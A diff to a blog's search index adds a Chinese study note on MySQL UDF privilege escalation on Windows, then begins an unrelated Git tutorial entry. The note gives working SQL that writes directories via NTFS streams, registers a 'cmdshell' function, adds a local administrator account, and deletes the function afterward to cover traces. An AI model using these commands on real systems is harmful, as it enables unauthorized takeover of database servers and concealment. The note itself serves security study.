@@ -68,6 +68,69 @@
     </entry>
     
     <entry>
+      <title><![CDATA[提权学习(三) UDF提权]]></title>
+      <url>/2017/08/13/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0(%E4%B8%89)%20UDF%E6%8F%90%E6%9D%83/</url>
+      <content type="html"><![CDATA[<h3 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h3><h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h4><p><strong>利用 <code>root</code> 的高权限来创建能够调用 <code>cmd</code> 的动态链接库 <code>udf.dll</code></strong></p>
+<h4 id="0x02-前提条件"><a href="#0x02-前提条件" class="headerlink" title="0x02 前提条件"></a>0x02 前提条件</h4><p><strong>1.判断 MySQL服务 是否存在</strong><br><strong>2.目标系统需要时 Windows(2000/XP/2003)</strong><br><strong>3.需要拥有一个 MySQL 账号，此账号必须拥有对 mysql 的 insert 和 delete 权限以创建和抛弃函数</strong></p>
+<h4 id="0x03-具体流程："><a href="#0x03-具体流程：" class="headerlink" title="0x03 具体流程："></a>0x03 具体流程：</h4><h5 id="1-前期工作："><a href="#1-前期工作：" class="headerlink" title="1.前期工作："></a>1.前期工作：</h5><p><strong>对数据库 <code>root</code> 账户的账号密码进行寻找(补充账号密码寻找方法)</strong></p>
+<h5 id="2-导出-udf"><a href="#2-导出-udf" class="headerlink" title="2.导出 udf"></a>2.导出 udf</h5><p><strong>判定数据库的版本</strong></p>
+<p><strong>(1)如果版本低于 5.1 则为低版本提权，将生成的动态链接库导出到系统盘符：<code>c:\windows\system32</code> 下即可。</strong></p>
+<pre><code>当 MySQL 版本在 4.1 以前时，可以将所有 DLL 文件里面的所有函数注册到 MySQL 里面以供 MySQL使用，无论 DLL 在什么位置都可以。
+
+当 MySQL 版本在 4.1-5.0 之间时，MySQL 对 UDF 函数进行了限制，只有实现了一个特定接口的函数才可以被成功注册到 MySQL 中，这样防止了通过 MySQL 非法调用系统的 DLL。
+
+当 MySQL 版本在 5.0-5.1 之间时，对注册的 DLL 的位置进行了限制，在创建函数的时候，所对应的 DLL 路径不能包含 `/` ，即不能是绝对路径。所以将 DLL 文件注册到 system32 目录来跳过此限制；或者放到盘符的更目录下，通过 `c:udf.dll` 这样的形式来绕过限制。但是后来发现只要把 DLL 文件放到 PATH 这个环境变量所记录的任何一个目录下，都和放在 system32 目录下下过一致。
+
+所以，根据以得出结论：只要 MySQL 版本低于 5.1 ，导出 udf.dll 文件的目录可以尽量写在 `c:\windows\system32` 下即可。
+</code></pre><p><strong>(2)如果版本大于等于 5.1 则为高版本提权，需要将生成的动态链接库导出到 mysql 安装路径下的 lib\plugin 目录下，但是在 MySQL 中并没有 lib目录，也没有 plugin目录，为了导出成功，则需要使用 SQL 命令创建两个目录，以下命令是查找 MySQL 安装目录，并在安装目录下常见 lib目录 和 plugin目录，这也是解决 <code>Can&#39;t open shared library</code> 问题时的方法</strong></p>
+<pre><code>//查找 MySQL 的安装目录
+select @@basedir;
+//利用 NTFS ADS 创建 lib目录
+select &apos;It is dll&apos; into dumpfile &apos;MySQL安装目录\\lib::$INDEX_ALLOCATION&apos;;
+//利用 NTFS ADS 创建 plugin目录
+select &apos;It is dll&apos; into dumpfile &apos;MySQL安装目录\\lib\\plugin::$INDEX_ALLOCATION&apos;;
+
+lib\plugin 文件夹本来是不存在的，需要先找到 MySQL 的安装路径，并在安装路径下创建 lib\plugin 文件夹，再将 udf.dll 文件导入该文件夹即可
+</code></pre><h5 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h5><ul>
+<li><strong>具体操作：</strong></li>
+</ul>
+<p><strong>(1)使用 SQL 语句创建功能函数：<code>create function 函数名(cmdshell) returns string soname &#39;导出的路径&#39;</code></strong></p>
+<pre><code>create function cmdshell returns string soname &apos;导出路径&apos;;
+</code></pre><p><strong>(2)添加用户的 SQL 语句：<code>select cmdshell(&#39;net user 用户名 用户名密码 /add&#39;);</code></strong></p>
+<pre><code>select cmdshell(&apos;net user yzc yzc /add&apos;);
+</code></pre><p><strong>(3)将用户添加到管理员组的 SQL 语句：<code>select cmdshell(&#39;net localgroup administrators 用户名 /add&#39;);</code></strong></p>
+<pre><code>select cmdshell(&apos;net localgroup administrators yzc /add&apos;);
+</code></pre><p>(4)删除函数的 SQL 语句：</p>
+<pre><code>drop function cmdshell;
+delete from mysql.func where name=&apos;cmdshell&apos;;
+</code></pre><ul>
+<li><strong>提权方式</strong></li>
+</ul>
+<p>(1)通过大马自带的 udf 提权功能来提权</p>
+<p>(2)利用 udf 提权脚本提权</p>
+<p>(3)使用 udf 提权工具进行提权</p>
+<pre><code>不推荐使用，因为使用工具的前提是目标站 MySQL服务 具有外联功能，若不具备外联功能工具将无法使用
+</code></pre><p>参考文章</p>
+<p><a href="http://www.91ri.org/3981.html" target="_blank" rel="external">udf提权方法和出现问题汇总</a></p>
+<p><a href="https://www.waitalone.cn/mysql-tiquan-summary.html" target="_blank" rel="external">MYSQL提权总结</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 提权 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> UDF提权 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Git 命令行操作的介绍]]></title>
       <url>/2017/08/05/git%20%E5%91%BD%E4%BB%A4/</url>
       <content type="html"><![CDATA[<h3 id="Git-命令"><a href="#Git-命令" class="headerlink" title="Git 命令"></a>Git 命令</h3><h4 id="0x01-Git-的介绍"><a href="#0x01-Git-的介绍" class="headerlink" title="0x01 Git 的介绍"></a>0x01 Git 的介绍</h4><p><strong>Git 是 Linux 的创始人 Linus Torvalds 开源的一款分布式版本控制系统，以帮助开发者更好的对项目进行版本管理。每一个优秀的开发者在进行项目开发时都会第一时间给自己的项目加上 Git，以便能更好的追踪代码修改，进行版本回溯等操作。在多人协作的开发过程中，Git 更是必不可少的。因此，本书中将使用 Git 来管理项目的所有代码，让你在阅读本书的时候能够体会到 Git 的强大，了解实际开发中我们对 Git 的应用。</strong></p>
